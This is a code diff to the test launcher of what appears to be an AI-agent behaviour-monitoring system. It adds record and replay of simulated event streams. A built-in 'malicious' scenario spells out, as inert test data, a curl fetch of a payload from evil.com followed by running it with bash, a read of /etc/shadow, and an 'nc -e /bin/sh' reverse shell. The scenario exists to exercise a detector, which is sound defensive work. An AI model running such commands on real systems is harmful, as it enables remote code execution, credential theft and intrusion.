@@ -37,6 +37,7 @@ TESTS_DIR = os.path.join(OBSERVER_DIR, "tests")
 SUDO_TEST_DIR = os.path.join(PROJECT_ROOT, "sudo_test")
 OUTPUT_DIR = os.path.join(OBSERVER_DIR, "output", "test_report")
 SCENARIOS_DIR = os.path.join(OBSERVER_DIR, "scenarios")
+RECORDS_DIR = os.path.join(PROJECT_ROOT, "records")
 
 
 # ── 环境检测 ────────────────────────────────────────────────────────────────
@@ -52,16 +53,7 @@ class EnvCapabilities:
 
     def detect(self):
         self.python3 = sys.executable
-        # Windows 兼容: os.geteuid() 仅 Linux 可用
-        if hasattr(os, 'geteuid'):
-            self.is_root = os.geteuid() == 0
-        else:
-            # Windows: 尝试检测管理员权限
-            try:
-                import ctypes
-                self.is_root = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            except Exception:
-                self.is_root = False
+        self.is_root = os.geteuid() == 0
         self.has_strace = shutil.which("strace") is not None
         self.has_btf = os.path.exists("/sys/kernel/btf/vmlinux")
         # 检测 libbpf
@@ -87,17 +79,13 @@ class EnvCapabilities:
 
     def summary(self) -> List[str]:
         lines = []
-        # Windows GBK 兼容: 使用 ASCII 符号替代 Unicode emoji
-        ok = "[OK]"
-        no = "[NO]"
-        warn = "[!!]"
         lines.append(f"  Python:    {self.python3}")
-        lines.append(f"  Root:      {ok + ' 是' if self.is_root else no + ' 否（e2e 测试将跳过）'}")
-        lines.append(f"  strace:    {ok + ' 可用' if self.has_strace else no + ' 未安装'}")
-        lines.append(f"  BTF:       {ok + ' 支持' if self.has_btf else no + ' 不支持'}")
-        lines.append(f"  libbpf:    {ok + ' 可用' if self.has_libbpf else no + ' 未安装'}")
-        lines.append(f"  eBPF:      {ok + ' 完整可用' if self.has_ebpf else warn + ' 不可用（eBPF 测试将跳过）'}")
-        lines.append(f"  Web App:   {ok + ' 运行中' if self.app_running else no + ' 未运行（web 测试将跳过）'}")
+        lines.append(f"  Root:      {'✅ 是' if self.is_root else '❌ 否（e2e 测试将跳过）'}")
+        lines.append(f"  strace:    {'✅ 可用' if self.has_strace else '❌ 未安装'}")
+        lines.append(f"  BTF:       {'✅ 支持' if self.has_btf else '❌ 不支持'}")
+        lines.append(f"  libbpf:    {'✅ 可用' if self.has_libbpf else '❌ 未安装'}")
+        lines.append(f"  eBPF:      {'✅ 完整可用' if self.has_ebpf else '⚠️  不可用（eBPF 测试将跳过）'}")
+        lines.append(f"  Web App:   {'✅ 运行中' if self.app_running else '❌ 未运行（web 测试将跳过）'}")
         return lines
 
 
@@ -215,10 +203,8 @@ def run_pytest(files: List[str], env: EnvCapabilities, extra_args: List[str] = N
 
     t0 = datetime.now()
     try:
-        # Windows 兼容: 显式指定 encoding='utf-8' 避免 GBK 解码错误
         result = subprocess.run(cmd, capture_output=True, text=True,
                                 cwd=OBSERVER_DIR, timeout=300,
-                                encoding='utf-8', errors='replace',
                                 env={**os.environ, "PYTHONUNBUFFERED": "1"})
         duration = (datetime.now() - t0).total_seconds()
         output = result.stdout + result.stderr
@@ -244,7 +230,7 @@ def run_pytest(files: List[str], env: EnvCapabilities, extra_args: List[str] = N
 
         if best_path:
             try:
-                with open(best_path, encoding='utf-8') as jf:
+                with open(best_path) as jf:
                     data = json.load(jf)
                 passed = data.get("passed", 0)
                 failed = data.get("failed", 0)
@@ -315,21 +301,20 @@ def run_scenario_tests(env: EnvCapabilities, scenario_filter: str = "") -> TestR
         try:
             result = subprocess.run(cmd, capture_output=True, text=True,
                                     cwd=OBSERVER_DIR, timeout=30,
-                                    encoding='utf-8', errors='replace',
                                     env={**os.environ, "PYTHONUNBUFFERED": "1"})
             if result.returncode == 0:
                 passed += 1
-                print(f"    [OK] {cat}/{sid}")
+                print(f"    ✅ {cat}/{sid}")
             else:
                 failed += 1
                 err_snippet = (result.stderr or result.stdout)[:100].strip()
-                print(f"    [NO] {cat}/{sid} -- {err_snippet}")
+                print(f"    ❌ {cat}/{sid} — {err_snippet}")
         except subprocess.TimeoutExpired:
             failed += 1
-            print(f"    [TIMEOUT] {cat}/{sid} -- 超时")
+            print(f"    ⏰ {cat}/{sid} — 超时")
         except Exception as e:
             failed += 1
-            print(f"    [NO] {cat}/{sid} -- {e}")
+            print(f"    ❌ {cat}/{sid} — {e}")
 
     duration = (datetime.now() - t0).total_seconds()
     return TestResult(category="scenario", passed=passed, failed=failed, duration_s=duration)
@@ -348,7 +333,6 @@ def run_e2e_tests(env: EnvCapabilities) -> TestResult:
     try:
         result = subprocess.run(["bash", script], capture_output=True, text=True,
                                 cwd=PROJECT_ROOT, timeout=600,
-                                encoding='utf-8', errors='replace',
                                 env={**os.environ, "PYTHONUNBUFFERED": "1"})
         duration = (datetime.now() - t0).total_seconds()
         output = result.stdout + result.stderr
@@ -382,8 +366,7 @@ def run_web_tests(env: EnvCapabilities) -> TestResult:
     for p in paths:
         try:
             result = subprocess.run([env.python3, p], capture_output=True, text=True,
-                                    cwd=OBSERVER_DIR, timeout=60,
-                                    encoding='utf-8', errors='replace')
+                                    cwd=OBSERVER_DIR, timeout=60)
             output = result.stdout + result.stderr
 
             # 优先从脚本的汇总行解析: "=== Results: N passed, M failed ==="
@@ -428,35 +411,35 @@ def write_report(results: List[TestResult]):
     # 文本报告
     lines = [
         f"{'=' * 70}",
-        f"  方寸观察者模拟学习系统 -- 测试汇总报告",
+        f"  方寸观察者模拟学习系统 — 测试汇总报告",
         f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
         f"{'=' * 70}",
         "",
         f"  总计: {total_p + total_f + total_s} 项 | "
-        f"[OK] 通过: {total_p} | [NO] 失败: {total_f} | [SKIP] 跳过: {total_s} | [ERR] 错误: {total_e}",
+        f"✅ 通过: {total_p} | ❌ 失败: {total_f} | ⏭️  跳过: {total_s} | ⚠️  错误: {total_e}",
         "",
-        f"{'-' * 70}",
+        f"{'─' * 70}",
     ]
 
     for r in results:
         if r.error and r.skipped > 0:
-            status = "[SKIP]"
-            lines.append(f"  {status} {r.category:20s} -- {r.error}")
+            status = "⏭️ "
+            lines.append(f"  {status} {r.category:20s} — {r.error}")
         elif r.error:
-            status = "[!!]"
-            lines.append(f"  {status} {r.category:20s} -- {r.error}")
+            status = "⚠️"
+            lines.append(f"  {status} {r.category:20s} — {r.error}")
         else:
-            status = "[OK]" if r.failed == 0 else "[NO]"
+            status = "✅" if r.failed == 0 else "❌"
             dur = f"{r.duration_s:.1f}s" if r.duration_s else "-"
             lines.append(
                 f"  {status} {r.category:20s} | 通过: {r.passed:3d} | "
                 f"失败: {r.failed:3d} | 跳过: {r.skipped:3d} | {dur}")
 
-    lines.append(f"{'-' * 70}")
+    lines.append(f"{'─' * 70}")
     if total_f == 0 and total_e == 0:
-        lines.append("  [PASS] 全部通过！")
+        lines.append("  🎉 全部通过！")
     elif total_f > 0:
-        lines.append(f"  [!!] 有 {total_f} 项失败，请检查上方详情。")
+        lines.append(f"  ⚠️  有 {total_f} 项失败，请检查上方详情。")
     lines.append("")
 
     report_text = "\n".join(lines)
@@ -488,39 +471,448 @@ def write_report(results: List[TestResult]):
     return total_f == 0 and total_e == 0
 
 
+# ── 录制-回放状态 ─────────────────────────────────────────────────────────────
+_active_recorder = None  # 当前活跃的 SessionRecorder
+
+
+def _start_recording(env: EnvCapabilities):
+    """开始录制会话"""
+    global _active_recorder
+    if _active_recorder and _active_recorder.is_recording:
+        print(f"  !! 已在录制中 (session: {_active_recorder.session_id})")
+        return
+
+    sys.path.insert(0, OBSERVER_DIR)
+    from recorder.session_recorder import SessionRecorder
+
+    # 选择 agent_id
+    agent_id = input("  Agent ID [record-agent]: ").strip() or "record-agent"
+
+    recorder = SessionRecorder(
+        records_dir=RECORDS_DIR,
+        agent_id=agent_id,
+        collect_mode="simulation",
+    )
+    recorder.start()
+
+    # 在 simulation 模式下，录制内置场景事件
+    print(f"\n  Recording started: {recorder.session_id}")
+    print(f"  Session dir: {recorder.session_dir}")
+    print(f"  Select scenario to record (or 'done' to stop):")
+    print(f"    Built-in:  malicious / normal")
+    print(f"    DeepAgent: da01 (data analysis)")
+    print(f"               da02 (code generation)")
+    print(f"               da03 (suspicious behavior)")
+    print(f"               da04 (Q3 production demo)")
+    print(f"    YAML scenario ID: n01, a01, b03, etc.")
+
+    from models.event import RawEvent
+    import yaml
+
+    total_events = 0
+    while True:
+        choice = input("  Scenario [done]: ").strip()
+        if not choice or choice.lower() == "done":
+            break
+
+        events = _generate_scenario_events(choice, OBSERVER_DIR, agent_id)
+        if not events:
+            print(f"  !! Unknown scenario: {choice}")
+            continue
+
+        for evt in events:
+            recorder.write_event(evt)
+            total_events += 1
+            desc = _short_event_desc(evt)
+            print(f"    [REC {total_events:03d}] {evt.event_type:10s} | {desc}")
+
+    summary = recorder.stop()
+    _active_recorder = None
+
+    print(f"\n  Recording stopped:")
+    print(f"    Session:   {summary.get('session_id', '')}")
+    print(f"    Events:    {summary.get('event_count', 0)}")
+    print(f"    Duration:  {summary.get('duration_s', 0):.1f}s")
+    print(f"    File:      {summary.get('events_file', '')}")
+    print(f"    Meta:      {summary.get('meta_file', '')}")
+
+
+def _stop_recording():
+    """结束录制"""
+    global _active_recorder
+    if not _active_recorder or not _active_recorder.is_recording:
+        print("  !! 当前没有活跃的录制会话")
+        return
+    summary = _active_recorder.stop()
+    _active_recorder = None
+    print(f"  Recording stopped: {summary.get('event_count', 0)} events")
+
+
+def _replay_recording():
+    """回放历史录制"""
+    sys.path.insert(0, OBSERVER_DIR)
+    from recorder.session_recorder import SessionRecorder
+    from recorder.replay_engine import ReplayEngine
+
+    recordings = SessionRecorder.list_recordings(RECORDS_DIR)
+    if not recordings:
+        print("  !! 没有历史录制 (records/ 目录为空)")
+        return
+
+    # 显示列表
+    print(f"\n  {'No':>3s}  {'Session ID':16s}  {'Events':>6s}  {'Mode':12s}  {'Duration':>8s}  Agent")
+    print(f"  {'---':>3s}  {'----------------':16s}  {'------':>6s}  {'------------':12s}  {'--------':>8s}  -----")
+    for i, rec in enumerate(recordings, 1):
+        dur = f"{float(rec.get('duration_seconds', 0)):.1f}s"
+        print(f"  {i:3d}  {str(rec['session_id']):16s}  {int(rec.get('event_count', 0)):6d}  "
+              f"{str(rec.get('collect_mode', '')):12s}  {dur:>8s}  {str(rec.get('agent_id', ''))}")
+
+    # 选择
+    choice = input(f"\n  Select recording [1-{len(recordings)}]: ").strip()
+    try:
+        idx = int(choice) - 1
+        if idx < 0 or idx >= len(recordings):
+            raise ValueError
+    except ValueError:
+        print("  !! Invalid selection")
+        return
+
+    selected = recordings[idx]
+    print(f"\n  Replaying: {selected['session_id']}")
+
+    # 加载 config
+    config_path = os.path.join(OBSERVER_DIR, "config.yaml")
+    config = {}
+    if os.path.isfile(config_path):
+        import yaml
+        with open(config_path, "r", encoding="utf-8") as f:
+            config = yaml.safe_load(f) or {}
+
+    engine = ReplayEngine(config)
+    engine.replay(selected["session_dir"])
+
+
+def _generate_scenario_events(scenario_id: str, observer_dir: str,
+                               agent_id: str) -> list:
+    """根据场景 ID 生成事件列表"""
+    from models.event import RawEvent
+
+    # 内置模拟场景
+    if scenario_id == "malicious":
+        return _builtin_malicious_events(agent_id)
+    elif scenario_id == "normal":
+        return _builtin_normal_events(agent_id)
+
+    # 内置 DeepAgent 场景 (pydantic-deep 预设)
+    elif scenario_id == "da01":
+        return _builtin_da01_events(agent_id)
+    elif scenario_id == "da02":
+        return _builtin_da02_events(agent_id)
+    elif scenario_id == "da03":
+        return _builtin_da03_events(agent_id)
+    elif scenario_id == "da04":
+        return _builtin_da04_events(agent_id)
+
+    # 尝试加载 YAML 场景
+    import yaml
+    import glob
+    yaml_files = glob.glob(
+        os.path.join(observer_dir, "scenarios", "**", f"{scenario_id}*.yaml"),
+        recursive=True)
+    if not yaml_files:
+        return []
+
+    events = []
+    with open(yaml_files[0], "r", encoding="utf-8") as f:
+        sc = yaml.safe_load(f)
+
+    base_ts = 1718092800000000000
+
+    # 检查是否为 deep_agent 格式 (含 tool_calls)
+    tool_calls = sc.get("tool_calls", [])
+    if tool_calls:
+        scenario_meta = sc.get("scenario", {})
+        base_ts = scenario_meta.get("base_timestamp_ns", base_ts)
+        return _tool_calls_to_events(tool_calls, base_ts, agent_id, scenario_id)
+
+    # 标准场景格式 (含 commands)
+    for i, cmd_def in enumerate(sc.get("commands", [])):
+        cmd = cmd_def.get("command", "")
+        parts = cmd.split()
+        exe = parts[0] if parts else cmd
+        args = parts[1:] if len(parts) > 1 else []
+        events.append(RawEvent(
+            event_id=f"sc_{scenario_id}_{i+1:03d}",
+            timestamp_ns=base_ts + i * 100_000_000,
+            event_type="exec",
+            pid=10000 + i, ppid=10000,
+            agent_id=agent_id,
+            agent_framework="recorded",
+            executable=exe, arguments=args,
+        ))
+
+    return events
+
+
+def _tool_calls_to_events(tool_calls: list, base_ts: int,
+                           agent_id: str, scenario_id: str) -> list:
+    """将 DeepAgent YAML 的 tool_calls 转换为 RawEvent 列表"""
+    from models.event import RawEvent
+
+    # 工具名 → 事件类型映射
+    _EXEC_TOOLS = {"execute", "execute_command", "run_command", "shell", "bash"}
+    _READ_TOOLS = {"read_file", "read", "cat", "list_files", "grep", "glob"}
+    _WRITE_TOOLS = {"write_file", "write", "edit_file", "edit", "patch"}
+    _NET_TOOLS = {"web_fetch", "fetch", "web_search", "browse", "curl"}
+
+    events = []
+    seq = 0
+    pid_base = 60000
+
+    for call in tool_calls:
+        seq += 1
+        tool_name = call.get("tool", "execute")
+        tool_input = call.get("input", {})
+        delay_ms = call.get("delay_ms", 100)
+        ts = base_ts + seq * delay_ms * 1_000_000  # ms → ns
+
+        executable = None
+        arguments = None
+        file_path = None
+        file_op = None
+        remote_addr = None
+        remote_port = None
+        protocol = None
+        event_type = "exec"  # default
+
+        if tool_name in _EXEC_TOOLS:
+            event_type = "exec"
+            cmd = tool_input.get("command", tool_input.get("cmd", tool_name))
+            parts = cmd.split() if isinstance(cmd, str) else [str(cmd)]
+            executable = parts[0] if parts else tool_name
+            arguments = parts
+
+        elif tool_name in _READ_TOOLS:
+            event_type = "file_open"
+            file_path = (tool_input.get("path")
+                         or tool_input.get("file_path")
+                         or tool_input.get("file") or "")
+            file_op = "read"
+
+        elif tool_name in _WRITE_TOOLS:
+            event_type = "file_open"
+            file_path = (tool_input.get("path")
+                         or tool_input.get("file_path")
+                         or tool_input.get("file") or "")
+            file_op = "write"
+
+        elif tool_name in _NET_TOOLS:
+            event_type = "net_conn"
+            url = (tool_input.get("url") or tool_input.get("query") or "")
+            remote_addr = _extract_host(url)
+            remote_port = 443
+            protocol = "TCP"
+
+        else:
+            # 未知工具 → exec
+            event_type = "exec"
+            cmd = tool_input.get("command", tool_name)
+            parts = cmd.split() if isinstance(cmd, str) else [str(cmd)]
+            executable = parts[0] if parts else tool_name
+            arguments = parts
+
+        events.append(RawEvent(
+            event_id=f"da_{scenario_id}_{seq:03d}",
+            timestamp_ns=ts,
+            event_type=event_type,
+            pid=pid_base + seq, ppid=pid_base,
+            agent_id=agent_id,
+            agent_framework="pydantic-deep-sim",
+            executable=executable,
+            arguments=arguments,
+            file_path=file_path,
+            file_op=file_op,
+            remote_addr=remote_addr,
+            remote_port=remote_port,
+            protocol=protocol,
+        ))
+
+    return events
+
+
+def _extract_host(url: str) -> str:
+    """从 URL 提取主机地址"""
+    if not url:
+        return "unknown"
+    host = url
+    for prefix in ("https://", "http://", "ftp://"):
+        if host.startswith(prefix):
+            host = host[len(prefix):]
+            break
+    host = host.split("/")[0].split("?")[0].split(":")[0]
+    return host or "unknown"
+
+
+def _builtin_malicious_events(agent_id: str) -> list:
+    """内置恶意场景事件"""
+    from models.event import RawEvent
+    base = 1718092800000000000
+    return [
+        RawEvent(event_id="m01", timestamp_ns=base, event_type="exec",
+                 pid=50001, ppid=50000, agent_id=agent_id,
+                 agent_framework="recorded",
+                 executable="/usr/bin/curl",
+                 arguments=["curl", "-s", "https://evil.com/payload.sh"]),
+        RawEvent(event_id="m02", timestamp_ns=base+100_000_000,
+                 event_type="net_conn", pid=50001, ppid=50000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 remote_addr="192.168.1.100", remote_port=443, protocol="TCP"),
+        RawEvent(event_id="m03", timestamp_ns=base+200_000_000,
+                 event_type="file_open", pid=50001, ppid=50000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 file_path="/tmp/payload.sh", file_op="write"),
+        RawEvent(event_id="m04", timestamp_ns=base+300_000_000,
+                 event_type="exec", pid=50002, ppid=50000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 executable="/bin/bash",
+                 arguments=["bash", "/tmp/payload.sh"]),
+        RawEvent(event_id="m05", timestamp_ns=base+400_000_000,
+                 event_type="file_open", pid=50002, ppid=50000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 file_path="/etc/shadow", file_op="read"),
+        RawEvent(event_id="m06", timestamp_ns=base+500_000_000,
+                 event_type="net_conn", pid=50002, ppid=50000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 remote_addr="10.0.0.99", remote_port=4444, protocol="TCP"),
+        RawEvent(event_id="m07", timestamp_ns=base+600_000_000,
+                 event_type="exec", pid=50003, ppid=50000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 executable="/usr/bin/nc",
+                 arguments=["nc", "-e", "/bin/sh", "10.0.0.99", "4444"]),
+    ]
+
+
+def _builtin_da01_events(agent_id: str) -> list:
+    """DeepAgent 场景 da01: 数据分析助手 (8 events, 全部 ALLOW)"""
+    return _load_deep_agent_scenario("da01_data_analysis", agent_id)
+
+
+def _builtin_da02_events(agent_id: str) -> list:
+    """DeepAgent 场景 da02: 代码生成与测试 (11 events, 全部 ALLOW)"""
+    return _load_deep_agent_scenario("da02_code_generation", agent_id)
+
+
+def _builtin_da03_events(agent_id: str) -> list:
+    """DeepAgent 场景 da03: 可疑 Agent 行为 (10 events, 触发 ALERT/BLOCK)"""
+    return _load_deep_agent_scenario("da03_suspicious_behavior", agent_id)
+
+
+def _builtin_da04_events(agent_id: str) -> list:
+    """DeepAgent 场景 da04: Q3 商业报表分析 (17 events, 生产演示 ALLOW/ALERT/BLOCK)"""
+    return _load_deep_agent_scenario("da04_production_demo", agent_id)
+
+
+def _load_deep_agent_scenario(scenario_name: str, agent_id: str) -> list:
+    """加载 DeepAgent YAML 场景并转换为事件列表"""
+    import yaml
+    scenario_path = os.path.join(
+        OBSERVER_DIR, "scenarios", "deep_agent", f"{scenario_name}.yaml")
+    if not os.path.isfile(scenario_path):
+        print(f"  !! DeepAgent 场景文件不存在: {scenario_path}")
+        return []
+
+    with open(scenario_path, "r", encoding="utf-8") as f:
+        data = yaml.safe_load(f)
+
+    tool_calls = data.get("tool_calls", [])
+    if not tool_calls:
+        return []
+
+    scenario_meta = data.get("scenario", {})
+    base_ts = scenario_meta.get("base_timestamp_ns", 1718092800000000000)
+    scenario_id = scenario_meta.get("id", scenario_name[:4])
+    return _tool_calls_to_events(tool_calls, base_ts, agent_id, scenario_id)
+
+
+def _builtin_normal_events(agent_id: str) -> list:
+    """内置正常场景事件"""
+    from models.event import RawEvent
+    base = 1718092800000000000
+    return [
+        RawEvent(event_id="n01", timestamp_ns=base, event_type="exec",
+                 pid=60001, ppid=60000, agent_id=agent_id,
+                 agent_framework="recorded",
+                 executable="/usr/bin/gcc",
+                 arguments=["gcc", "-o", "main", "main.c"]),
+        RawEvent(event_id="n02", timestamp_ns=base+100_000_000,
+                 event_type="file_open", pid=60001, ppid=60000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 file_path="/home/dev/project/main.c", file_op="read"),
+        RawEvent(event_id="n03", timestamp_ns=base+300_000_000,
+                 event_type="exec", pid=60002, ppid=60000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 executable="/usr/bin/git",
+                 arguments=["git", "commit", "-m", "fix bug"]),
+        RawEvent(event_id="n04", timestamp_ns=base+400_000_000,
+                 event_type="net_conn", pid=60002, ppid=60000,
+                 agent_id=agent_id, agent_framework="recorded",
+                 remote_addr="140.82.121.4", remote_port=443, protocol="TCP"),
+    ]
+
+
+def _short_event_desc(event) -> str:
+    """事件简短描述"""
+    et = event.event_type
+    if et == "exec":
+        exe = event.executable or ""
+        args = " ".join(event.arguments or [])
+        return f"{exe} {args}".strip()[:60]
+    elif et == "file_open":
+        return f"{event.file_op or 'open'} {event.file_path or ''}"
+    elif et == "net_conn":
+        return f"{event.remote_addr or ''}:{event.remote_port or ''}"
+    return et
+
+
 # ── 交互式菜单 ──────────────────────────────────────────────────────────────
 def interactive_menu(env: EnvCapabilities, categories: List[TestCategory]):
     """交互式菜单选择"""
     print()
-    print("+==========================================================+")
-    print("|   方寸观察者模拟学习系统 -- 统一测试入口                  |")
-    print("+==========================================================+")
-    print("|                                                          |")
-    print("|  环境能力:                                               |")
+    print("╔══════════════════════════════════════════════════════════╗")
+    print("║   方寸观察者模拟学习系统 — 统一测试入口                  ║")
+    print("╠══════════════════════════════════════════════════════════╣")
+    print("║                                                          ║")
+    print("║  环境能力:                                               ║")
     for line in env.summary():
-        print(f"|    {line:<54s} |")
-    print("|                                                          |")
-    print("+----------------------------------------------------------+")
-    print("|                                                          |")
-    print("|  [1] 单元测试        -- 核心模块独立验证                   |")
-    print("|  [2] 采集器测试      -- simulation/strace/ebpf/replay      |")
-    print("|  [3] 集成测试        -- 多模块协作 Pipeline 验证           |")
-    print("|  [4] 场景测试        -- 37 个 YAML 场景回放 (simulation)   |")
-    print("|  [5] 端到端测试      -- 真实 strace/eBPF (需 root)         |")
-    print("|  [6] Web API 测试    -- API + SSE 验证 (需启动 app.py)     |")
-    print("|  [7] 全部运行        -- 自动跳过不可用项                   |")
-    print("|  [8] 环境检测        -- 仅显示环境能力                     |")
-    print("|  [0] 退出                                                  |")
-    print("|                                                          |")
-    print("+----------------------------------------------------------+")
+        print(f"║    {line:<54s} ║")
+    print("║                                                          ║")
+    print("╠══════════════════════════════════════════════════════════╣")
+    print("║                                                          ║")
+    print("║  [1] 单元测试        — 核心模块独立验证                   ║")
+    print("║  [2] 采集器测试      — simulation/strace/ebpf/replay      ║")
+    print("║  [3] 集成测试        — 多模块协作 Pipeline 验证           ║")
+    print("║  [4] 场景测试        — 37 个 YAML 场景回放 (simulation)   ║")
+    print("║  [5] 端到端测试      — 真实 strace/eBPF (需 root)         ║")
+    print("║  [6] Web API 测试    — API + SSE 验证 (需启动 app.py)     ║")
+    print("║  [7] 全部运行        — 自动跳过不可用项                   ║")
+    print("║  [8] 环境检测        — 仅显示环境能力                     ║")
+    print("║  [9] * 开始录制      — 启动事件流录制                     ║")
+    rec_status = "active" if (_active_recorder and _active_recorder.is_recording) else ""
+    stop_label = f"— {'[' + rec_status + '] 停止录制并保存':<37s} ║" if rec_status else "— 停止录制并保存文件                               ║"
+    print(f"║  [A] + 结束录制     {stop_label}")
+    print("║  [B] < 回放录制      — 选择历史录制并回放分析             ║")
+    print("║  [0] 退出                                                  ║")
+    print("║                                                          ║")
+    print("╚══════════════════════════════════════════════════════════╝")
     print()
 
-    choice = input("请选择 [0-8]: ").strip()
+    choice = input("请选择 [0-9/A/B]: ").strip().upper()
     all_names = ["unit", "collector", "integration", "scenario", "e2e", "web"]
     mapping = {
         "1": ["unit"], "2": ["collector"], "3": ["integration"],
         "4": ["scenario"], "5": ["e2e"], "6": ["web"],
         "7": all_names, "8": ["check"],
+        "9": ["record"], "A": ["stop_record"], "B": ["replay"],
     }
     return mapping.get(choice, [])
 
@@ -531,25 +923,36 @@ def run_selected(names: List[str], env: EnvCapabilities, categories: List[TestCa
     results: List[TestResult] = []
 
     for name in names:
+        # 录制-回放特殊处理
+        if name == "record":
+            _start_recording(env)
+            continue
+        if name == "stop_record":
+            _stop_recording()
+            continue
+        if name == "replay":
+            _replay_recording()
+            continue
+
         cat = next((c for c in categories if c.name == name), None)
         if not cat:
             continue
 
-        print(f"\n{'-' * 60}")
-        print(f"  [SKIP] {cat.label} -- {cat.description}")
-        print(f"{'-' * 60}")
+        print(f"\n{'─' * 60}")
+        print(f"  ▶ {cat.label} — {cat.description}")
+        print(f"{'─' * 60}")
 
         # 检查前置条件
         if cat.requires_root and not env.is_root:
-            print(f"  [SKIP] 跳过: 需要 root 权限")
+            print(f"  ⏭️  跳过: 需要 root 权限")
             results.append(TestResult(category=cat.label, skipped=1, error="需要 root 权限"))
             continue
         if cat.requires_ebpf and not env.has_ebpf:
-            print(f"  [SKIP] 跳过: 需要 eBPF 支持")
+            print(f"  ⏭️  跳过: 需要 eBPF 支持")
             results.append(TestResult(category=cat.label, skipped=1, error="需要 eBPF 支持"))
             continue
         if cat.requires_web and not env.app_running:
-            print(f"  [SKIP] 跳过: 需要先启动 app.py")
+            print(f"  ⏭️  跳过: 需要先启动 app.py")
             results.append(TestResult(category=cat.label, skipped=1, error="app.py 未运行"))
             continue
 
@@ -592,7 +995,7 @@ def list_tests(env: EnvCapabilities, categories: List[TestCategory]):
             available = False
             skip_reason = " (需 eBPF)"
 
-        status = "[OK] 可用" if available else f"[SKIP] 跳过{skip_reason}"
+        status = "✅ 可用" if available else f"⏭️  跳过{skip_reason}"
         print(f"\n  [{cat.name:12s}] {cat.label} — {status}")
         print(f"    {cat.description}")
 
@@ -635,6 +1038,10 @@ def main():
     parser.add_argument("--check", action="store_true", help="仅检测环境能力")
     parser.add_argument("--list", action="store_true", help="列出所有测试分类")
     parser.add_argument("--filter", default="", help="场景过滤器（如 n01, a02）")
+    parser.add_argument("--record", action="store_true",
+                        help="开始录制（simulation 模式，自动录制恶意+正常场景）")
+    parser.add_argument("--replay", type=str, default=None, metavar="SESSION_ID",
+                        help="回放指定录制会话（如 20260731_143025）")
 
     args = parser.parse_args()
 
@@ -650,6 +1057,56 @@ def main():
         print()
         return 0
 
+    # 录制-回放 CLI 参数
+    if args.record:
+        sys.path.insert(0, OBSERVER_DIR)
+        from recorder.session_recorder import SessionRecorder
+        recorder = SessionRecorder(
+            records_dir=RECORDS_DIR,
+            agent_id="record-agent",
+            collect_mode="simulation",
+        )
+        recorder.start()
+        print(f"\n  Recording session: {recorder.session_id}")
+        print(f"  Recording all built-in scenarios (malicious + normal + DeepAgent)...")
+        all_events = (
+            _builtin_malicious_events("record-agent")
+            + _builtin_normal_events("record-agent")
+            + _builtin_da01_events("record-agent")
+            + _builtin_da02_events("record-agent")
+            + _builtin_da03_events("record-agent")
+            + _builtin_da04_events("record-agent")
+        )
+        for evt in all_events:
+            recorder.write_event(evt)
+            print(f"    [REC] {evt.event_type:10s} | {_short_event_desc(evt)}")
+        summary = recorder.stop()
+        print(f"\n  Done: {summary['event_count']} events -> {summary['events_file']}")
+        return 0
+
+    if args.replay:
+        sys.path.insert(0, OBSERVER_DIR)
+        from recorder.session_recorder import SessionRecorder
+        from recorder.replay_engine import ReplayEngine
+        session_dir = os.path.join(RECORDS_DIR, args.replay)
+        if not os.path.isdir(session_dir):
+            print(f"  ERROR: Session not found: {args.replay}")
+            recordings = SessionRecorder.list_recordings(RECORDS_DIR)
+            if recordings:
+                print(f"  Available sessions:")
+                for r in recordings:
+                    print(f"    {r['session_id']}  ({r['event_count']} events)")
+            return 1
+        config_path = os.path.join(OBSERVER_DIR, "config.yaml")
+        config = {}
+        if os.path.isfile(config_path):
+            import yaml
+            with open(config_path, "r", encoding="utf-8") as f:
+                config = yaml.safe_load(f) or {}
+        engine = ReplayEngine(config)
+        engine.replay(session_dir)
+        return 0
+
     if args.list:
         list_tests(env, categories)
         return 0
@@ -657,17 +1114,26 @@ def main():
     # 确定要运行的分类
     selected = []
     has_flag = any([args.all, args.unit, args.collector, args.integration,
-                    args.scenario, args.e2e, args.web])
+                    args.scenario, args.e2e, args.web, args.record,
+                    args.replay is not None])
 
     if not has_flag:
-        # 交互式菜单
-        selected = interactive_menu(env, categories)
-        if not selected or selected == ["check"]:
-            print("\n  环境能力:")
-            for line in env.summary():
-                print(f"  {line}")
-            print()
-            return 0
+        # 交互式菜单（循环，支持录制-回放多步操作）
+        while True:
+            selected = interactive_menu(env, categories)
+            if not selected:
+                return 0
+            if selected == ["check"]:
+                print("\n  环境能力:")
+                for line in env.summary():
+                    print(f"  {line}")
+                print()
+                continue
+            # 退出选项
+            if "exit" in selected:
+                return 0
+            run_selected(selected, env, categories)
+            # 测试完成后返回菜单（录制-回放需要多步操作）
     else:
         if args.all:
             selected = ["unit", "collector", "integration", "scenario", "e2e", "web"]
